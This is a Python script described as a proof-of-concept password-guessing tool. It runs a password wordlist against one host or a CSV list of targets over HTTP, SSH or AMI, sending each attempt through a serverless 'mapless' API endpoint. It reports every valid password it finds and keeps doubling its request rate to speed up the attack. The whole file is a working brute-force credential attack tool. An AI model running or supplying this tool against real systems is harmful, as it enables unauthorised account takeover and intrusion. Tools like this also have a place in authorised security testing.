#!/usr/bin/env python

"""
This is a PoC password guessing tool that uses the mapless API
"""

import json
from sys import maxsize as INT_MAX
import os
import asyncio
from multiprocessing import Pool
from optparse import OptionParser
import logging
import socket

import aiohttp
from asyncio_throttle import Throttler
import colorit


async def increment_rate_limit(throttler: Throttler):
    while True:
        await asyncio.sleep(5)
        throttler.rate_limit *= 2
        logging.debug(len(asyncio.all_tasks()))
        if len(asyncio.all_tasks()) <= 2:
            return


async def main():
    parser = OptionParser()
    parser.add_option("-U", "--url", dest="base_url",
                      help="the mapless api base url (eg.: https://0000000000.execute-api.us-east-1.amazonaws.com)")
    parser.add_option("-K", "--api-key", dest="api_key",
                      help="the mapless api key (eg.: 5ViTxWEDxR3Rk9T5tTquV5VktPKlBP8Z9QjHcqe1)")
    parser.add_option("-H", "--host", dest="host",
                      help="hostname/IP")
    parser.add_option("-p", "--port", type=int, dest="port", default=80,
                      help="port (default: 80)")
    parser.add_option("-u", "--user", dest="username", default='root',
                      help="username")
    parser.add_option("-P", "--password", dest="password_file",
                      help="file with passwords")
    parser.add_option("", "--proto", dest="proto", default="http",
                      help="supported protocol [http, ssh, ami] (default: http)")
    parser.add_option("-f", "--file", dest="targets_file",
                      help="csv file with targets (format: ip, port)")
    parser.add_option("--rl", "--rate-limit", type=int, dest="rate_limit", default=INT_MAX,
                      help="limit the number of requests/period (default: no limit)")
    parser.add_option("--rlp", "--rate-limit-period", type=float, dest="rate_limit_period", default=1.0,
                      help="rate limit period (default: 1.0)")
    parser.add_option("--cl", "--connection-limit", type=int, dest="connection_limit", default=16,
                      help="number of simultaneous connections to the API backend (default: 16)")
    parser.add_option("-v", "--verbose",
                      action="store_true", dest="verbose", default=False,
                      help="print INFO level messages to stdout")
    parser.add_option("-d", "--debug",
                      action="store_true", dest="debug", default=False,
                      help="print DEBUG level messages to stdout")

    (options, _) = parser.parse_args()

    if options.verbose:
        logging.basicConfig(level=logging.INFO)
    elif options.debug:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.WARNING)

    BASE_URL = os.environ.get('MAPLESS_BASE_URL', options.base_url)
    ENDPOINT = f'/dev/login/{options.proto}'
    URL = f'{BASE_URL}{ENDPOINT}'
    APIKEY = os.environ.get('MAPLESS_API_KEY', options.api_key)
    HEADERS = {'X-API-KEY': APIKEY, 'Content-Type': 'application/json'}
    logging.debug(f'HEADERS: {HEADERS}')
    CONNECTOR = aiohttp.TCPConnector(
        limit_per_host=options.connection_limit, ttl_dns_cache=100)
    THROTTLER = Throttler(rate_limit=options.rate_limit,
                          period=options.rate_limit_period)

    async def test_auth(session, host, port, username, password, throttler):
        params = {'host': host, 'port': port,
                  'username': username, 'password': password}
        async with throttler, session.get(URL, params=params) as resp:
            logging.info(f"{username}:{password}@{host}:{port}")
            if resp.status == 200:
                data = await resp.json()
                logging.debug(data)
                print(
                    f"Found valid password {colorit.color_front(password,0,255,0)} for {username}@{host}:{port}")
            elif resp.status > 401:
                data = await resp.json()
                logging.debug(data)

    with open(options.password_file, 'r') as password_file:
        async with aiohttp.ClientSession(headers=HEADERS, connector=CONNECTOR) as session:
            scan_args = []
            for password in password_file.readlines():
                if options.targets_file:
                    import csv
                    with open(options.targets_file, 'r') as csvfile:
                        reader = csv.DictReader(csvfile)
                        scan_args += list(map(lambda row: {
                            'host': row['ip'],
                            'port': row['port'],
                            'username': options.username,
                            'password': password.strip(),
                            'session': session,
                            'throttler': THROTTLER
                        }, reader))
                else:
                    scan_args.append({
                        'host': options.host,
                        'port': options.port,
                        'username': options.username,
                        'password': password.strip(),
                        'session': session,
                        'throttler': THROTTLER
                    })

            tasks = []
            logging.debug(f'# OF TASKS: {len(scan_args)}')
            for args in scan_args:
                task = asyncio.create_task(test_auth(**args))
                tasks.append(task)

            asyncio.create_task(increment_rate_limit(THROTTLER))

            import tqdm
            responses = []
            for f in tqdm.tqdm(asyncio.as_completed(tasks), total=len(tasks)):
                responses.append(await f)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Ctrl+C pressed, exiting ...")
        loop = asyncio.get_event_loop()
        # stopping the event loop
        if loop:
            print("Stopping event loop ...")
            loop.stop()
        print("Shutdown complete ...")
